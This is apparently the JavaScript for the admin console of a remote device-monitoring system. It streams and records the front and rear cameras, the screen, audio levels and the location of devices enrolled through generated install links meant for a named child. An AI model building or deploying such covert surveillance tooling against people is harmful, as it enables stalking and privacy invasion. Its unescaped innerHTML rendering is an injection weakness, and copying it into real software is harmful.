let ws;
let devices = [];
let selectedDevice = null;

function connect() {
    const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    ws = new WebSocket(`${wsProtocol}//${window.location.host}?type=admin`);
    
    ws.onopen = () => {
        console.log('Connected');
        loadOfflineDevices();
    };
    
    ws.onmessage = (event) => {
        const data = JSON.parse(event.data);
        
        if (data.type === 'devices') {
            devices = data.devices;
            saveOfflineDevices();
            renderDevices();
        } else if (data.type === 'device_update') {
            const idx = devices.findIndex(d => d.id === data.device.id);
            if (idx >= 0) devices[idx] = data.device;
            else devices.push(data.device);
            saveOfflineDevices();
            renderDevices();
        } else if (data.type === 'location') {
            updateLocation(data.deviceId, data.lat, data.lng);
        } else if (data.type === 'screen') {
            displayScreen(data.image);
        } else if (data.type === 'audio') {
            displayAudio(data.audio);
        } else if (data.type === 'camera') {
            displayCamera(data.image, data.camera);
        }
    };
    
    ws.onclose = () => setTimeout(connect, 3000);
}

function saveOfflineDevices() {
    localStorage.setItem('devices', JSON.stringify(devices));
}

function loadOfflineDevices() {
    const stored = localStorage.getItem('devices');
    if (stored) {
        devices = JSON.parse(stored);
        renderDevices();
    }
}

function renderDevices() {
    const list = document.getElementById('deviceList');
    list.innerHTML = devices.map(d => `
        <div class="device-card ${d.status}" onclick="selectDevice('${d.id}')">
            <h3>${d.name}</h3>
            <span class="status">${d.status}</span>
            <p>Location: ${d.lat ? d.lat.toFixed(4) : '0.0000'}, ${d.lng ? d.lng.toFixed(4) : '0.0000'}</p>
        </div>
    `).join('');
}

let frontRecorder = null;
let rearRecorder = null;
let frontChunks = [];
let rearChunks = [];
let frontCanvas = null;
let rearCanvas = null;
let frontCtx = null;
let rearCtx = null;

function selectDevice(id) {
    selectedDevice = devices.find(d => d.id === id);
    showTab('monitor');
    document.getElementById('monitorContent').innerHTML = `
        <h3>${selectedDevice.name}</h3>
        <div class="monitor-grid">
            <div class="monitor-box">
                <h4>📷 Front Camera</h4>
                <div id="frontCameraView" class="view">Connecting...</div>
                <button onclick="toggleRecording('front')" id="frontRecBtn">⏺️ Record</button>
            </div>
            <div class="monitor-box">
                <h4>📷 Rear Camera</h4>
                <div id="rearCameraView" class="view">Connecting...</div>
                <button onclick="toggleRecording('rear')" id="rearRecBtn">⏺️ Record</button>
            </div>
            <div class="monitor-box">
                <h4>Screen Mirror</h4>
                <div id="screenView" class="view">Connecting...</div>
            </div>
            <div class="monitor-box">
                <h4>Location</h4>
                <div id="locationView" class="view">
                    <p>Lat: ${selectedDevice.lat || 0}</p>
                    <p>Lng: ${selectedDevice.lng || 0}</p>
                </div>
            </div>
        </div>
    `;
    startCamera('front');
    startCamera('rear');
}

function startScreen() {
    if (selectedDevice) {
        ws.send(JSON.stringify({ type: 'request_screen', deviceId: selectedDevice.id }));
    }
}

function startAudio() {
    if (selectedDevice) {
        ws.send(JSON.stringify({ type: 'request_audio', deviceId: selectedDevice.id }));
    }
}

function startCamera(type) {
    if (selectedDevice) {
        ws.send(JSON.stringify({ type: 'request_camera', deviceId: selectedDevice.id, camera: type }));
    }
}

function displayCamera(image, camera) {
    const viewId = camera === 'front' ? 'frontCameraView' : 'rearCameraView';
    const view = document.getElementById(viewId);
    if (view) {
        const img = document.getElementById(`${camera}Img`);
        if (img) {
            img.src = image;
        } else {
            view.innerHTML = `<img src="${image}" style="width:100%;height:auto;" id="${camera}Img">`;
        }
    }
}

function toggleRecording(camera) {
    const btn = document.getElementById(camera === 'front' ? 'frontRecBtn' : 'rearRecBtn');
    const img = document.getElementById(`${camera}Img`);
    
    if (camera === 'front') {
        if (!frontRecorder) {
            frontChunks = [];
            frontCanvas = document.createElement('canvas');
            frontCanvas.width = 1280;
            frontCanvas.height = 720;
            frontCtx = frontCanvas.getContext('2d', { alpha: false });
            
            const stream = frontCanvas.captureStream(30);
            frontRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            
            frontRecorder.ondataavailable = e => { if (e.data && e.data.size > 0) frontChunks.push(e.data); };
            frontRecorder.onstop = () => {
                if (frontChunks.length > 0) {
                    const blob = new Blob(frontChunks, { type: 'video/webm' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = `front_${Date.now()}.webm`;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    setTimeout(() => URL.revokeObjectURL(url), 100);
                }
                frontRecorder = null;
                frontCanvas = null;
                frontCtx = null;
                frontChunks = [];
            };
            
            const recordLoop = () => {
                if (frontRecorder && frontRecorder.state === 'recording' && img && img.complete) {
                    frontCtx.drawImage(img, 0, 0, frontCanvas.width, frontCanvas.height);
                }
                if (frontRecorder && frontRecorder.state === 'recording') {
                    requestAnimationFrame(recordLoop);
                }
            };
            
            frontRecorder.start(1000);
            btn.textContent = '⏹️ Stop';
            btn.style.background = '#f44336';
            requestAnimationFrame(recordLoop);
        } else {
            if (frontRecorder.state === 'recording') {
                frontRecorder.stop();
            }
            btn.textContent = '⏺️ Record';
            btn.style.background = '';
        }
    } else {
        if (!rearRecorder) {
            rearChunks = [];
            rearCanvas = document.createElement('canvas');
            rearCanvas.width = 1280;
            rearCanvas.height = 720;
            rearCtx = rearCanvas.getContext('2d', { alpha: false });
            
            const stream = rearCanvas.captureStream(30);
            rearRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            
            rearRecorder.ondataavailable = e => { if (e.data && e.data.size > 0) rearChunks.push(e.data); };
            rearRecorder.onstop = () => {
                if (rearChunks.length > 0) {
                    const blob = new Blob(rearChunks, { type: 'video/webm' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = `rear_${Date.now()}.webm`;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    setTimeout(() => URL.revokeObjectURL(url), 100);
                }
                rearRecorder = null;
                rearCanvas = null;
                rearCtx = null;
                rearChunks = [];
            };
            
            const recordLoop = () => {
                if (rearRecorder && rearRecorder.state === 'recording' && img && img.complete) {
                    rearCtx.drawImage(img, 0, 0, rearCanvas.width, rearCanvas.height);
                }
                if (rearRecorder && rearRecorder.state === 'recording') {
                    requestAnimationFrame(recordLoop);
                }
            };
            
            rearRecorder.start(1000);
            btn.textContent = '⏹️ Stop';
            btn.style.background = '#f44336';
            requestAnimationFrame(recordLoop);
        } else {
            if (rearRecorder.state === 'recording') {
                rearRecorder.stop();
            }
            btn.textContent = '⏺️ Record';
            btn.style.background = '';
        }
    }
}

function displayScreen(image) {
    document.getElementById('screenView').innerHTML = `<img src="${image}" style="width:100%;height:auto;">`;
}

function displayAudio(level) {
    document.getElementById('audioView').innerHTML = `<div class="audio-level">🎤 Level: ${level}</div>`;
}

function updateLocation(deviceId, lat, lng) {
    const device = devices.find(d => d.id === deviceId);
    if (device) {
        device.lat = lat;
        device.lng = lng;
        if (selectedDevice && selectedDevice.id === deviceId) {
            document.getElementById('locationView').innerHTML = `
                <p>Lat: ${lat.toFixed(4)}</p>
                <p>Lng: ${lng.toFixed(4)}</p>
            `;
        }
    }
}

function generateLink() {
    const name = document.getElementById('childName').value;
    if (!name) return alert('Enter name');
    
    const id = Math.random().toString(36).substr(2, 8);
    const protocol = window.location.protocol;
    const host = window.location.host;
    const link = `${protocol}//${host}/device.html?id=${id}&name=${encodeURIComponent(name)}`;
    
    fetch('/api/device/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id, name })
    });
    
    document.getElementById('installLink').value = link;
    document.getElementById('linkBox').style.display = 'block';
}

function copyLink() {
    const input = document.getElementById('installLink');
    input.select();
    document.execCommand('copy');
    alert('Link copied!');
}

function showTab(tab) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.sidebar button').forEach(b => b.classList.remove('active'));
    document.getElementById(tab).classList.add('active');
    event.target.classList.add('active');
}

connect();
